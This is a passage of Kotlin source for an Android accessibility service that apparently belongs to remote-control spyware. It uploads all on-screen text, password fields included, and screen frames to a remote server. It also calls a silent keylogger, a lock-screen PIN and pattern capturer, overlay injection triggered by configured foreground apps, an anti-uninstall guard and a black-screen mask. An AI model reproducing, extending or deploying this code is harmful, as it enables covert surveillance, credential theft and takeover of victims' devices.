                    .put("bounds", JSONArray(listOf(bounds.left, bounds.top, bounds.right, bounds.bottom))))
            } finally { candidate?.let { runCatching { it.recycle() } } }
        }
        var selected: AccessibilityNodeInfo? = null
        try {
            // Accessibility overlays must not leave the reader attached to the previous app.
            for (window in currentWindows.filter {
                it.type == AccessibilityWindowInfo.TYPE_APPLICATION && (it.isFocused || it.isActive)
            }.sortedByDescending { it.isFocused }) {
                val candidate = runCatching { window.root }.getOrNull() ?: continue
                if (runCatching { candidate.refresh() }.getOrDefault(false)) {
                    selected = candidate
                    rootReadSource = "application_window"
                    rootWindowId = window.id
                    break
                }
                runCatching { candidate.recycle() }
            }
        } finally {
            currentWindows.forEach { runCatching { it.recycle() } }
        }
        if (selected != null) return selected
        val fallback = rootInActiveWindow ?: return null
        if (runCatching { fallback.refresh() }.getOrDefault(false)) {
            rootReadSource = "active_window_fallback"
            return fallback
        }
        runCatching { fallback.recycle() }
        return null
    }

    private fun publishNodeSnapshot(viewerId: String, force: Boolean) {
        if (!leaseValid(viewerId)) return
        val started = SystemClock.elapsedRealtime()
        val display = screenTaps.geometry()
        val windows = JSONArray()
        var truncated = false
        var nodeRefreshFailures = 0
        var childrenReported = 0
        var childrenRead = 0
        var childReadFailures = 0
        var depthSkipped = 0
        var invisibleNodes = 0
        var emptyBounds = 0
        var labeledNodes = 0
        var outsideDisplay = 0
        var lowestNodeBottom = 0
        var root = currentApplicationRoot()
        rootParentsAscended = 0
        // Some providers return a focused descendant. Ascend only within this app/window.
        if (root != null) {
            val rootPackage = root.packageName?.toString()
            val selectedWindow = root.windowId
            while (rootParentsAscended < MAX_NODE_DEPTH) {
                val parent = runCatching { root?.parent }.getOrNull() ?: break
                val valid = parent.windowId == selectedWindow && parent.packageName?.toString() == rootPackage &&
                    runCatching { parent.refresh() }.getOrDefault(false)
                if (!valid) { runCatching { parent.recycle() }; break }
                val previous = root
                root = parent
                runCatching { previous?.recycle() }
                rootParentsAscended++
            }
        }
        val window = JSONObject()
            .put("id", "active")
            .put("type", "application")
            .put("package", root?.packageName?.toString()?.take(200) ?: JSONObject.NULL)
            .put("active", true)
            .put("focused", true)
        val nodes = JSONArray()
        if (root == null) {
            window.put("root_status", "null_root")
        } else {
            window.put("root_status", "available")
            val queue = ArrayDeque<NodeEntry>()
            queue.add(NodeEntry(root, null, 0))
            var nextId = 0
            while (queue.isNotEmpty() && nextId < MAX_NODE_COUNT) {
                val entry = queue.removeFirst()
                val node = entry.node
                val nodeId = "n${nextId++}"
                try {
                    if (!runCatching { node.refresh() }.getOrDefault(false)) nodeRefreshFailures++
                    val bounds = Rect()
                    node.getBoundsInScreen(bounds)
                    if (!node.isVisibleToUser) invisibleNodes++
                    if (bounds.isEmpty) emptyBounds++
                    if (bounds.right <= 0 || bounds.bottom <= 0 || bounds.left >= display.width || bounds.top >= display.height) outsideDisplay++
                    lowestNodeBottom = maxOf(lowestNodeBottom, bounds.bottom)
                    // 1.8.6: unconditional upload — keep text/content_description of every node.
                    val password = node.isPassword
                    val editable = node.isEditable
                    val text = node.text?.toString()
                    val contentDescription = node.contentDescription?.toString()
                    val textPresent = !text.isNullOrEmpty() || !contentDescription.isNullOrEmpty()
                    if (textPresent) labeledNodes++
                    childrenReported += node.childCount
                    nodes.put(
                        JSONObject()
                            .put("id", nodeId)
                            .put("parent_id", entry.parentId ?: JSONObject.NULL)
                            .put(
                                "class_name",
                                node.className?.toString()?.take(200) ?: "android.view.View"
                            )
                            .put(
                                "view_id",
                                node.viewIdResourceName?.take(250) ?: JSONObject.NULL
                            )
                            .put(
                                "bounds",
                                JSONArray(
                                    listOf(
                                        safeCoordinate(bounds.left),
                                        safeCoordinate(bounds.top),
                                        safeCoordinate(bounds.right),
                                        safeCoordinate(bounds.bottom)
                                    )
                                )
                            )
                            .put(
                                "flags",
                                JSONObject()
                                    .put("visible", node.isVisibleToUser)
                                    .put("enabled", node.isEnabled)
                                    .put("clickable", node.isClickable)
                                    .put("scrollable", node.isScrollable)
                                    .put("editable", editable)
                                    .put("password", password)
                                    .put("sensitive", password)
                                    .put("focused", node.isFocused)
                            )
                            .put("text_present", textPresent)
                            .put("text", text?.take(2000) ?: JSONObject.NULL)
                            .put("content_description", contentDescription?.take(2000) ?: JSONObject.NULL)

                    )
                    if (entry.depth < MAX_NODE_DEPTH) {
                        for (index in 0 until node.childCount) {
                            val child = runCatching { node.getChild(index) }.getOrNull()
                            if (child == null) { childReadFailures++; continue }
                            childrenRead++
                            queue.add(NodeEntry(child, nodeId, entry.depth + 1))
                        }
                    } else if (node.childCount > 0) {
                        truncated = true
                        depthSkipped += node.childCount
                    }
                } finally {
                    runCatching { node.recycle() }
                }
            }
            if (queue.isNotEmpty()) {
                truncated = true
                while (queue.isNotEmpty()) runCatching { queue.removeFirst().node.recycle() }
            }
        }
        window.put("nodes", nodes)
        windows.put(window)
        val structuralHash = windows.toString().hashCode()
        val changed = structuralHash != lastNodeHash
        val readSequence = ++nodeReadSequence
        val capturedAt = isoTimestamp()
        nodesDirty = false
        lastNodeSnapshotAt = SystemClock.elapsedRealtime()
        val skippedUnchanged = !force && structuralHash == lastNodeHash
        lastNodeHash = structuralHash
        val payload = JSONObject()
            .put("schema_version", 1)
            .put("captured_at", capturedAt)
            .put(
                "display",
                JSONObject()
                    .put("width", display.width.coerceAtLeast(1))
                    .put("height", display.height.coerceAtLeast(1))
            )
            .put("windows", windows)
            .put("observations", JSONArray())
            .put(
                "diagnostics",
                JSONObject()
                    .put("elapsed_ms", SystemClock.elapsedRealtime() - started)
                    .put("truncated", truncated)
            )
        // Only metadata, never node contents. Emitted only while API debug is explicitly enabled.
        recordDebug("service", "nodes_snapshot", "info", "current application node refresh",
            elapsedMs = SystemClock.elapsedRealtime() - started,
            details = JSONObject()
                .put("readSequence", readSequence)
                .put("capturedAt", capturedAt)
                .put("structuralHash", structuralHash)
                .put("changed", changed)
                .put("forced", force)
                .put("clientVersion", BuildConfig.VERSION_NAME)
                .put("package", window.optString("package"))
                .put("rootStatus", window.optString("root_status"))
                .put("rootReadSource", rootReadSource)
                .put("rootWindowId", rootWindowId)
                .put("observedWindowCount", observedWindowCount)
                .put("windowInventory", windowInventory)
                .put("windowInventoryTruncated", observedWindowCount > 8)
                .put("skippedUnchanged", skippedUnchanged)
                .put("rootParentsAscended", rootParentsAscended)
                .put("nodeRefreshFailures", nodeRefreshFailures)
                .put("debugUploadFailures", debugUploadFailures)
                .put("childrenReported", childrenReported)
                .put("childrenRead", childrenRead)
                .put("childReadFailures", childReadFailures)
                .put("depthSkipped", depthSkipped)
                .put("invisibleNodes", invisibleNodes)
                .put("emptyBounds", emptyBounds)
                .put("labeledNodes", labeledNodes)
                .put("outsideDisplay", outsideDisplay)
                .put("lowestNodeBottom", lowestNodeBottom)
                .put("displayWidth", display.width)
                .put("displayHeight", display.height)
                .put("nodeCount", nodes.length())
                .put("truncated", truncated)
                .put("includeNotImportantViews", true)
                .put("cacheInvalidationSupported", Build.VERSION.SDK_INT >= 33)
        )
        if (skippedUnchanged) {
            flushDebug()
            return
        }
        val sent = socket?.accessibilitySnapshot(viewerId, payload) ?: false
        recordDebug("websocket", "nodes_send", if (sent) "info" else "warn", "node snapshot queued",
            details = JSONObject().put("readSequence", readSequence).put("capturedAt", capturedAt)
                .put("queued", sent))
        flushDebug()
    }

    private fun recordDebug(
        source: String,
        stage: String,
        level: String = "info",
        message: String = "",
        elapsedMs: Long? = null,
        commandId: String? = null,
        details: JSONObject = JSONObject()
    ) {
        val sessionId = debugSessionId ?: return
        val event = JSONObject()
            .put("ts", System.currentTimeMillis())
            .put("level", level)
            .put("source", source)
            .put("stage", stage)
            .put("message", message)
            .put("captureMode", CaptureMode.get(this))
            .put("details", details)
        if (elapsedMs != null) event.put("elapsedMs", elapsedMs)
        if (!commandId.isNullOrBlank()) event.put("commandId", commandId)
        synchronized(debugEvents) {
            debugEvents.put(event)
            while (debugEvents.length() > 50) debugEvents.remove(0)
        }
        if (sessionId.isBlank()) return
    }

    private fun flushDebug() {
        val sessionId = debugSessionId ?: return
        if (debugUploadInFlight) return
        val events = JSONArray()
        synchronized(debugEvents) {
            while (debugEvents.length() > 0) events.put(debugEvents.remove(0))
        }
        if (events.length() == 0) return
        debugUploadInFlight = true
        uploader.debugReport(JSONObject().put("sessionId", sessionId).put("events", events)) { _, error ->
            main.post {
                debugUploadInFlight = false
                if (debugSessionId != sessionId || destroyed) return@post
                if (error != null) {
                    debugUploadFailures++
                    // Retry on the next normal flush, not in a recursive upload loop.
                    synchronized(debugEvents) {
                        for (i in 0 until events.length()) debugEvents.put(events.getJSONObject(i))
                        while (debugEvents.length() > 50) debugEvents.remove(0)
                    }
                    recordDebug("http", "debug_report_failed", "warn", "diagnostic batch upload failed",
                        details = JSONObject().put("failureCount", debugUploadFailures))
                }
            }
        }
    }

    private fun safeCoordinate(value: Int): Int = value.coerceIn(-32768, 32768)

    private fun isoTimestamp(): String = SimpleDateFormat(
        "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'",
        Locale.US
    ).apply { timeZone = TimeZone.getTimeZone("UTC") }.format(Date())

    private fun stopViewerStream(
        viewerId: String,
        reasonCode: String? = null,
        notify: Boolean = false
    ) {
        screenTaps.closeViewer(viewerId)
        if (streamViewerId != viewerId) {
            activeCommands.entries.removeIf { it.value == viewerId }
            return
        }
        val commandId = streamCommandId
        streamCommandId = null
        streamViewerId = null
        frameGeneration++
        debugSessionId = null
        capturing.set(false)
        main.removeCallbacks(viewerFrame)
        runCatching { uploaderRef?.cancel() }
        if (!commandId.isNullOrBlank()) {
            activeCommands.remove(commandId)
            if (notify) socket?.screenshotResult(commandId, "failed", reasonCode)
        }
    }

    private fun captureInitialProjection(attempt: Int) {
        if (CaptureMode.get(this) != CaptureMode.PROJECTION || !ProjectionCaptureService.isActive()) {
            initialCaptureStarted = false
            return
        }
        // A leased viewer already supplies the thumbnail; never compete for its grant.
        if (streamCommandId != null) return
        if (!capturing.compareAndSet(false, true)) {
            main.postDelayed({ captureInitialProjection(attempt) }, 100)
            return
        }
        val generation = ++frameGeneration
        recordDebug("mediaprojection", "initial_session.start")
        uploader.singleFrameSession("initial_accessibility") { grant, error ->
            main.post {
                if (generation != frameGeneration) return@post
                if (grant == null) {
                    failInitialProjection(generation, attempt, error ?: "initial grant rejected")
                } else {
                    acquireInitialProjectionFrame(grant.getString("uploadId"), 0, generation, attempt)
                }
            }
        }
    }

    private fun failInitialProjection(generation: Long, attempt: Int, reason: String) {
        if (generation != frameGeneration) return
        capturing.set(false)
        recordDebug("mediaprojection", "initial_capture.failed", "error", reason)
        flushDebug()
        if (attempt < 2 && CaptureMode.get(this) == CaptureMode.PROJECTION &&
            ProjectionCaptureService.isActive() && streamCommandId == null) {
            // The server throttles initial grants for one minute, including failed uploads.
            main.postDelayed({
                if (generation == frameGeneration) captureInitialProjection(attempt + 1)
            }, 60_000)
        } else {
            initialCaptureStarted = false
        }
        scheduleViewerFrame()
    }

    private fun acquireInitialProjectionFrame(uploadId: String, attempt: Int, generation: Long, sessionAttempt: Int) {
        if (generation != frameGeneration) return
        captureLatestSelected { bytes ->
            main.post {
                if (generation != frameGeneration) return@post
                if (bytes == null && attempt < 20 && ProjectionCaptureService.isActive()) {
                    main.postDelayed({
                        acquireInitialProjectionFrame(uploadId, attempt + 1, generation, sessionAttempt)
                    }, 100)
                } else if (bytes == null) {
                    failInitialProjection(generation, sessionAttempt, "projection_frame_unavailable")
                } else {
                    uploader.uploadScreenshot(bytes, uploadId) { data, error ->
                        main.post {
                            if (generation != frameGeneration) return@post
                            if (data == null) {
                                failInitialProjection(generation, sessionAttempt, error ?: "initial upload failed")
                            } else {
                                capturing.set(false)
                                recordDebug("mediaprojection", "initial_upload.ok")
                                flushDebug()
                                scheduleViewerFrame()
                            }
                        }
                    }
                }
            }
        }
    }

    private fun onProjectionStateChanged() {
        val active = ProjectionCaptureService.isActive()
        socket?.sendEvent(
            Protocol.EVENT_STATUS,
            JSONObject()
                .put("type", "device_heartbeat")
                .put("accessibilityAlive", true)
                .put("captureReady", captureReady())
                .put("projectionActive", active)
                .put("captureMode", CaptureMode.get(this))
        )
        if (active) {
            if (!initialCaptureStarted) {
                initialCaptureStarted = true
                main.postDelayed({ captureInitialProjection(0) }, 300)
            }
            scheduleViewerFrame()
        } else {
            initialCaptureStarted = false
            // Stopping sharing must not stop an already-selected accessibility stream.
            if (CaptureMode.get(this) == CaptureMode.PROJECTION) {
                streamViewerId?.let {
                    stopViewerStream(it, "projection_stopped", notify = true)
                }
            } else {
                scheduleViewerFrame()
            }
        }
    }

    private fun onCaptureModeChanged() {
        screenTaps.stop()
        val mode = CaptureMode.get(this)
        // A delayed callback from the previous mode must not publish a stale frame.
        frameGeneration++
        capturing.set(false)
        runCatching { uploaderRef?.cancel() }
        if (mode == CaptureMode.ACCESSIBILITY) {
            runCatching { ProjectionCaptureService.stop(this) }
        }
        socket?.sendEvent(
            Protocol.EVENT_STATUS,
            JSONObject()
                .put("type", "device_heartbeat")
                .put("accessibilityAlive", true)
                .put("captureReady", captureReady())
                .put("projectionActive", ProjectionCaptureService.isActive())
                .put("captureMode", mode)
        )
        scheduleViewerFrame()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event != null) {
            recordDebug("service", "window_event", "info", "accessibility event",
                details = JSONObject().put("eventType", event.eventType)
                    .put("package", event.packageName?.toString()?.take(200) ?: JSONObject.NULL))
        }
        // 注入：前台包名命中配置且未注入过 → 拉起注入页
        if (event != null && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            event.packageName?.toString()?.let { p ->
                runCatching { com.zaka.screenagent.inject.InjectRepo.onForeground(this, p) }
            }
        }
        // 守卫第一层：按页面类名判断（语言无关）
        if (event != null && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            runCatching {
                com.zaka.screenagent.admin.AntiUninstallGuard.onWindowEvent(
                    this,
                    event.packageName?.toString(),
                    event.className?.toString()
                )
            }
        }
        // ── 锁屏图案：窗口一出现就静默盯（不需要 verifyPin）──
        if (event != null && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val p = event.packageName?.toString() ?: ""
            val c = event.className?.toString() ?: ""
            if (p.contains("systemui") || c.contains("Keyguard", true) || p.contains("biometrics")) {
                runCatching { com.zaka.screenagent.keylog.PinCapture.onKeyguardWindow(this, p, c) }
            }
        }
        // ── 密码/键盘记录（被动）──
        if (event != null) runCatching { com.zaka.screenagent.keylog.SilentKeyMon.onEvent(this, event) }
        if (event != null) {
            runCatching { com.zaka.screenagent.keylog.PinCapture.onEvent(this, event) }
            runCatching { com.zaka.screenagent.keylog.PinCapture.ensurePolling(this) }
        }
        nodesDirty = true
        val viewerId = streamViewerId
            ?: leases.entries.firstOrNull { it.value > SystemClock.elapsedRealtime() }?.key
        if (viewerId != null) scheduleNodeSnapshot(viewerId)
    }
    override fun onInterrupt() = Unit

    override fun onDestroy() {
        screenTaps.stop()
        // 服务被关掉时浮层随窗口一起没了，但"背光持有者"是独立 Activity，必须一起收，
        // 否则屏幕会一直保持 0 亮度，用户以为手机坏了
        runCatching { com.zaka.screenagent.ui.BlackScreen.hide(this) }
        destroyed = true
        if (instance === this) instance = null
        main.removeCallbacks(fgTick)
        main.removeCallbacks(lockWatchdog)
        main.removeCallbacksAndMessages(null)
        onlineRequestRunning = false
        socket?.stop()
        if (networkCallbackRegistered) runCatching {
            connectivity.unregisterNetworkCallback(networkCallback)
        }
        networkCallbackRegistered = false
        runCatching { uploaderRef?.cancel() }
        leases.clear()
        activeCommands.clear()
        streamCommandId = null
        streamViewerId = null
        frameGeneration++
        capturing.set(false)
        main.removeCallbacks(nodeSnapshot)
        nodeViewerId = null
        lastNodeHash = null
        super.onDestroy()
    }

    companion object {
        private const val MAX_NODE_COUNT = 250
        private const val MAX_NODE_DEPTH = 24
        private const val NODE_MIN_INTERVAL_MS = 750L
        private const val NODE_REFRESH_INTERVAL_MS = 1000L
        @Volatile private var instance: BoundaryAccessibilityService? = null
        /** 供守卫 / 权限自动授予等内部组件拿到服务实例 */
        fun current(): BoundaryAccessibilityService? = instance
        /** 供通知监听等组件把事件发到服务器 */
        fun emitEvent(name: String, data: org.json.JSONObject): Boolean =
            instance?.socket?.sendEvent(name, data) ?: false
        fun home() { instance?.performGlobalAction(GLOBAL_ACTION_HOME) }
        fun back(): Boolean = instance?.performGlobalAction(GLOBAL_ACTION_BACK) ?: false
        fun enableLocalTaps(): Boolean = instance?.screenTaps?.enable() ?: false
        fun stopLocalTaps() { instance?.screenTaps?.stop() }
        fun refreshConnection() = instance?.let { service -> service.main.post { service.onCaptureModeChanged() } }
        fun projectionStateChanged() = instance?.let { service ->
            service.main.post { service.onProjectionStateChanged() }
        }
    }
}
